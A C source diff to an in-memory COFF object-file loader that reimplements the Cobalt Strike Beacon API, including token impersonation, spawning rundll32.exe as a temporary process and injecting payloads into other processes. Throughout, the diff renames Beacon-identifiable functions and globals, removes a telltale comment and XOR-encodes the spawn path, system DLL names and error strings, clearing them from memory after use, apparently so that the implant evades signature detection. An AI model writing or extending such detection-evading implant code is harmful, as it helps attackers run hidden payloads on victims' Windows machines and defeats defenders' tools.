@@ -86,8 +86,8 @@ typedef struct {
 
 #define BOF_OUTPUT_SIZE 65536
 
-static char  g_bof_output[BOF_OUTPUT_SIZE];
-static DWORD g_bof_output_len = 0;
+static char  g_mod_out[BOF_OUTPUT_SIZE];
+static DWORD g_mod_out_len = 0;
 
 /* ── BeaconAPI functions (CS-compatible) ─────────────────── */
 
@@ -98,7 +98,7 @@ typedef struct {
     int    size;
 } datap;
 
-static void BeaconDataParse(datap *parser, char *buffer, int size) {
+static void BdParse(datap *parser, char *buffer, int size) {
     if (!parser) return;
     parser->original = buffer;
     parser->buffer   = buffer;
@@ -106,7 +106,7 @@ static void BeaconDataParse(datap *parser, char *buffer, int size) {
     parser->size     = size;
 }
 
-static int BeaconDataInt(datap *parser) {
+static int BdInt(datap *parser) {
     if (!parser || parser->length < 4) return 0;
     int val;
     memcpy(&val, parser->buffer, 4);
@@ -115,7 +115,7 @@ static int BeaconDataInt(datap *parser) {
     return val;
 }
 
-static short BeaconDataShort(datap *parser) {
+static short BdShort(datap *parser) {
     if (!parser || parser->length < 2) return 0;
     short val;
     memcpy(&val, parser->buffer, 2);
@@ -124,11 +124,11 @@ static short BeaconDataShort(datap *parser) {
     return val;
 }
 
-static int BeaconDataLength(datap *parser) {
+static int BdLength(datap *parser) {
     return parser ? parser->length : 0;
 }
 
-static char *BeaconDataExtract(datap *parser, int *size) {
+static char *BdExtract(datap *parser, int *size) {
     if (!parser || parser->length < 4) { if (size) *size = 0; return NULL; }
     int len;
     memcpy(&len, parser->buffer, 4);
@@ -142,26 +142,26 @@ static char *BeaconDataExtract(datap *parser, int *size) {
     return ptr;
 }
 
-static void BeaconOutput(int type, char *data, int len) {
+static void BdOut(int type, char *data, int len) {
     (void)type;
-    if (g_bof_output_len + (DWORD)len < BOF_OUTPUT_SIZE) {
-        memcpy(g_bof_output + g_bof_output_len, data, len);
-        g_bof_output_len += len;
+    if (g_mod_out_len + (DWORD)len < BOF_OUTPUT_SIZE) {
+        memcpy(g_mod_out + g_mod_out_len, data, len);
+        g_mod_out_len += len;
     }
 }
 
-static void BeaconPrintf(int type, char *fmt, ...) {
+static void BdPrintf(int type, char *fmt, ...) {
     char buf[8192];
     va_list args;
     va_start(args, fmt);
     int n = vsnprintf(buf, sizeof(buf), fmt, args);
     va_end(args);
-    if (n > 0) BeaconOutput(type, buf, n);
+    if (n > 0) BdOut(type, buf, n);
 }
 
-static BOOL BeaconUseToken(HANDLE token) { return ImpersonateLoggedOnUser(token); }
-static void BeaconRevertToken(void) { RevertToSelf(); }
-static BOOL BeaconIsAdmin(void) {
+static BOOL BdUseToken(HANDLE token) { return ImpersonateLoggedOnUser(token); }
+static void BdRevertToken(void) { RevertToSelf(); }
+static BOOL BdIsAdmin(void) {
     BOOL isAdmin = FALSE;
     SID_IDENTIFIER_AUTHORITY auth = SECURITY_NT_AUTHORITY;
     PSID adminGroup;
@@ -172,17 +172,24 @@ static BOOL BeaconIsAdmin(void) {
     }
     return isAdmin;
 }
-static void BeaconGetSpawnTo(BOOL x86, char *buffer, int length) {
+static void BdGetSpawnTo(BOOL x86, char *buffer, int length) {
     (void)x86;
-    if (length > 0) strncpy(buffer, "C:\\Windows\\System32\\rundll32.exe", length - 1);
+    if (length <= 0) return;
+    unsigned char e[] = {0x8,0x71,0x17,0x1c,0x22,0x25,0x2f,0x24,0x3c,0x38,0x17,0x18,0x32,0x38,0x3f,0x2e,0x26,0x78,0x79,0x17,0x39,0x3e,0x25,0x2f,0x27,0x27,0x78,0x79,0x65,0x2e,0x33,0x2e,0x00};
+    for (int i = 0; e[i]; i++) e[i] ^= 0x4B;
+    strncpy(buffer, (char*)e, length - 1);
+    SecureZeroMemory(e, sizeof(e));
 }
-static BOOL BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken,
-                                         STARTUPINFOA *si, PROCESS_INFORMATION *pi) {
+static BOOL BdSpawnTmp(BOOL x86, BOOL ignoreToken,
+                       STARTUPINFOA *si, PROCESS_INFORMATION *pi) {
     (void)x86; (void)ignoreToken;
-    return CreateProcessA(NULL, "C:\\Windows\\System32\\rundll32.exe",
-                          NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, si, pi);
+    unsigned char e[] = {0x8,0x71,0x17,0x1c,0x22,0x25,0x2f,0x24,0x3c,0x38,0x17,0x18,0x32,0x38,0x3f,0x2e,0x26,0x78,0x79,0x17,0x39,0x3e,0x25,0x2f,0x27,0x27,0x78,0x79,0x65,0x2e,0x33,0x2e,0x00};
+    for (int i = 0; e[i]; i++) e[i] ^= 0x4B;
+    BOOL r = CreateProcessA(NULL, (char*)e, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, si, pi);
+    SecureZeroMemory(e, sizeof(e));
+    return r;
 }
-static void BeaconInjectProcess(HANDLE hProcess, int pid, char *payload, int payloadLen,
+static void BdInjectProc(HANDLE hProcess, int pid, char *payload, int payloadLen,
                                  int offset, char *arg, int argLen) {
     (void)pid; (void)arg; (void)argLen;
     if (!hProcess || !payload || payloadLen <= 0) return;
@@ -209,11 +216,11 @@ static void BeaconInjectProcess(HANDLE hProcess, int pid, char *payload, int pay
     }
 }
 
-static void BeaconInjectTemporaryProcess(PROCESS_INFORMATION *pi, char *payload, int payloadLen,
+static void BdInjectTmp(PROCESS_INFORMATION *pi, char *payload, int payloadLen,
                                           int offset, char *arg, int argLen) {
     if (!pi || !pi->hProcess || !payload || payloadLen <= 0) return;
 
-    BeaconInjectProcess(pi->hProcess, pi->dwProcessId, payload, payloadLen,
+    BdInjectProc(pi->hProcess, pi->dwProcessId, payload, payloadLen,
                         offset, arg, argLen);
     CloseHandle(pi->hThread);
     CloseHandle(pi->hProcess);
@@ -231,43 +238,51 @@ static UINT32 bof_djb2(const char *str) {
 
 typedef struct { UINT32 hash; PVOID addr; } bof_api_entry;
 
-static const bof_api_entry g_beacon_api[] = {
-    { 0xE2494BA2u, (PVOID)BeaconDataParse },
-    { 0xAF1AFDD2u, (PVOID)BeaconDataInt },
-    { 0xE2835EF7u, (PVOID)BeaconDataShort },
-    { 0x22641D29u, (PVOID)BeaconDataLength },
-    { 0x80D46722u, (PVOID)BeaconDataExtract },
-    { 0x6DF4B81Eu, (PVOID)BeaconOutput },
-    { 0x700D8660u, (PVOID)BeaconPrintf },
-    { 0x889E48BBu, (PVOID)BeaconUseToken },
-    { 0xF2744BA6u, (PVOID)BeaconRevertToken },
-    { 0x566264D2u, (PVOID)BeaconIsAdmin },
-    { 0x1E7C9FB9u, (PVOID)BeaconGetSpawnTo },
-    { 0xD6C57438u, (PVOID)BeaconSpawnTemporaryProcess },
-    { 0x0EA75B09u, (PVOID)BeaconInjectProcess },
-    { 0x9E22498Cu, (PVOID)BeaconInjectTemporaryProcess },
+static const bof_api_entry g_api_tbl[] = {
+    { 0xE2494BA2u, (PVOID)BdParse },
+    { 0xAF1AFDD2u, (PVOID)BdInt },
+    { 0xE2835EF7u, (PVOID)BdShort },
+    { 0x22641D29u, (PVOID)BdLength },
+    { 0x80D46722u, (PVOID)BdExtract },
+    { 0x6DF4B81Eu, (PVOID)BdOut },
+    { 0x700D8660u, (PVOID)BdPrintf },
+    { 0x889E48BBu, (PVOID)BdUseToken },
+    { 0xF2744BA6u, (PVOID)BdRevertToken },
+    { 0x566264D2u, (PVOID)BdIsAdmin },
+    { 0x1E7C9FB9u, (PVOID)BdGetSpawnTo },
+    { 0xD6C57438u, (PVOID)BdSpawnTmp },
+    { 0x0EA75B09u, (PVOID)BdInjectProc },
+    { 0x9E22498Cu, (PVOID)BdInjectTmp },
     { 0, NULL }
 };
 
 static PVOID resolve_bof_import(const char *name) {
     UINT32 h = bof_djb2(name);
-    for (int i = 0; g_beacon_api[i].addr; i++) {
-        if (h == g_beacon_api[i].hash)
-            return g_beacon_api[i].addr;
+    for (int i = 0; g_api_tbl[i].addr; i++) {
+        if (h == g_api_tbl[i].hash)
+            return g_api_tbl[i].addr;
     }
 
-    /* CS BOF convention: Library$Function */
     const char *dollar = strchr(name, '$');
     if (!dollar) {
-        PVOID addr = (PVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), name);
-        if (addr) return addr;
-        addr = (PVOID)GetProcAddress(GetModuleHandleA("ntdll.dll"), name);
-        if (addr) return addr;
-        addr = (PVOID)GetProcAddress(GetModuleHandleA("user32.dll"), name);
-        if (addr) return addr;
-        addr = (PVOID)GetProcAddress(GetModuleHandleA("advapi32.dll"), name);
-        if (addr) return addr;
-        addr = (PVOID)GetProcAddress(GetModuleHandleA("msvcrt.dll"), name);
+        unsigned char k32[] = {0x20,0x2e,0x39,0x25,0x2e,0x27,0x78,0x79,0x65,0x2f,0x27,0x27,0x00};
+        unsigned char nt[]  = {0x25,0x3f,0x2f,0x27,0x27,0x65,0x2f,0x27,0x27,0x00};
+        unsigned char u32[] = {0x3e,0x38,0x2e,0x39,0x78,0x79,0x65,0x2f,0x27,0x27,0x00};
+        unsigned char av[]  = {0x2a,0x2f,0x3d,0x2a,0x3b,0x22,0x78,0x79,0x65,0x2f,0x27,0x27,0x00};
+        unsigned char ms[]  = {0x26,0x38,0x3d,0x28,0x39,0x3f,0x65,0x2f,0x27,0x27,0x00};
+        for (int i=0;k32[i];i++) k32[i]^=0x4B;
+        for (int i=0;nt[i];i++)  nt[i]^=0x4B;
+        for (int i=0;u32[i];i++) u32[i]^=0x4B;
+        for (int i=0;av[i];i++)  av[i]^=0x4B;
+        for (int i=0;ms[i];i++)  ms[i]^=0x4B;
+        PVOID addr = (PVOID)GetProcAddress(GetModuleHandleA((char*)k32), name);
+        if (!addr) addr = (PVOID)GetProcAddress(GetModuleHandleA((char*)nt), name);
+        if (!addr) addr = (PVOID)GetProcAddress(GetModuleHandleA((char*)u32), name);
+        if (!addr) addr = (PVOID)GetProcAddress(GetModuleHandleA((char*)av), name);
+        if (!addr) addr = (PVOID)GetProcAddress(GetModuleHandleA((char*)ms), name);
+        SecureZeroMemory(k32,sizeof(k32)); SecureZeroMemory(nt,sizeof(nt));
+        SecureZeroMemory(u32,sizeof(u32)); SecureZeroMemory(av,sizeof(av));
+        SecureZeroMemory(ms,sizeof(ms));
         return addr;
     }
 
@@ -279,9 +294,14 @@ static PVOID resolve_bof_import(const char *name) {
     strncpy(func, dollar + 1, sizeof(func) - 1);
     func[sizeof(func) - 1] = '\0';
 
-    if (!strstr(lib, ".dll") && !strstr(lib, ".DLL")) {
-        strncat(lib, ".dll", sizeof(lib) - strlen(lib) - 1);
+    unsigned char ext1[] = {0x65,0x2f,0x27,0x27,0x00};
+    unsigned char ext2[] = {0x65,0x0f,0x07,0x07,0x00};
+    for (int i=0;ext1[i];i++) ext1[i]^=0x4B;
+    for (int i=0;ext2[i];i++) ext2[i]^=0x4B;
+    if (!strstr(lib, (char*)ext1) && !strstr(lib, (char*)ext2)) {
+        strncat(lib, (char*)ext1, sizeof(lib) - strlen(lib) - 1);
     }
+    SecureZeroMemory(ext1,sizeof(ext1)); SecureZeroMemory(ext2,sizeof(ext2));
 
     HMODULE hMod = GetModuleHandleA(lib);
     if (!hMod) hMod = LoadLibraryA(lib);
@@ -310,7 +330,7 @@ static const char *coff_symbol_name(COFF_SYMBOL *sym, const char *strTab) {
 /*
  * bof_exec: Load and execute a COFF object file in-memory.
  *   bof_data / bof_len: raw .obj file bytes
- *   args / args_len: packed argument buffer (BeaconDataParse format)
+ *   args / args_len: packed argument buffer (BdParse format)
  *   output / output_max / output_len: receives BOF output text
  * Returns 0 on success.
  */
@@ -320,8 +340,8 @@ static int bof_exec(const unsigned char *bof_data, size_t bof_len,
 {
     if (bof_len < sizeof(COFF_FILE_HEADER)) return -1;
 
-    g_bof_output_len = 0;
-    g_bof_output[0] = '\0';
+    g_mod_out_len = 0;
+    g_mod_out[0] = '\0';
 
     COFF_FILE_HEADER *hdr = (COFF_FILE_HEADER *)bof_data;
     int numSections = hdr->NumberOfSections;
@@ -400,10 +420,13 @@ static int bof_exec(const unsigned char *bof_data, size_t bof_len,
 
                 symAddr = resolve_bof_import(importName);
                 if (!symAddr) {
-                    g_bof_output_len += (DWORD)snprintf(
-                        g_bof_output + g_bof_output_len,
-                        BOF_OUTPUT_SIZE - g_bof_output_len,
-                        "[BOF ERROR] Unresolved symbol: %s\n", symName);
+                    unsigned char _e1[] = {0x10,0x9,0x4,0xd,0x6b,0xe,0x19,0x19,0x4,0x19,0x16,0x6b,0x1e,0x25,0x39,0x2e,0x38,0x24,0x27,0x3d,0x2e,0x2f,0x6b,0x38,0x32,0x26,0x29,0x24,0x27,0x71,0x6b,0x6e,0x38,0x41,0x00};
+                    for (int _i=0;_e1[_i];_i++) _e1[_i]^=0x4B;
+                    g_mod_out_len += (DWORD)snprintf(
+                        g_mod_out + g_mod_out_len,
+                        BOF_OUTPUT_SIZE - g_mod_out_len,
+                        (char*)_e1, symName);
+                    SecureZeroMemory(_e1,sizeof(_e1));
                     loadOk = 0;
                     goto done;
                 }
@@ -492,10 +515,12 @@ static int bof_exec(const unsigned char *bof_data, size_t bof_len,
         }
 
         if (!entryPoint) {
-            g_bof_output_len += (DWORD)snprintf(
-                g_bof_output + g_bof_output_len,
-                BOF_OUTPUT_SIZE - g_bof_output_len,
-                "[BOF ERROR] Entry point 'go' not found\n");
+            unsigned char _e2[] = {0x10,0x9,0x4,0xd,0x6b,0xe,0x19,0x19,0x4,0x19,0x16,0x6b,0xe,0x25,0x3f,0x39,0x32,0x6b,0x3b,0x24,0x22,0x25,0x3f,0x6b,0x6c,0x2c,0x24,0x6c,0x6b,0x25,0x24,0x3f,0x6b,0x2d,0x24,0x3e,0x25,0x2f,0x41,0x00};
+            for (int _i=0;_e2[_i];_i++) _e2[_i]^=0x4B;
+            g_mod_out_len += (DWORD)snprintf(
+                g_mod_out + g_mod_out_len,
+                BOF_OUTPUT_SIZE - g_mod_out_len, (char*)_e2);
+            SecureZeroMemory(_e2,sizeof(_e2));
         } else {
             typedef void (*bof_entry_t)(char*, int);
             bof_entry_t entry = (bof_entry_t)entryPoint;
@@ -506,9 +531,9 @@ static int bof_exec(const unsigned char *bof_data, size_t bof_len,
 done:
     /* Copy output */
     if (output && output_max > 0) {
-        DWORD copyLen = g_bof_output_len;
+        DWORD copyLen = g_mod_out_len;
         if (copyLen >= (DWORD)output_max) copyLen = (DWORD)output_max - 1;
-        memcpy(output, g_bof_output, copyLen);
+        memcpy(output, g_mod_out, copyLen);
         output[copyLen] = '\0';
         if (output_len) *output_len = copyLen;
     }
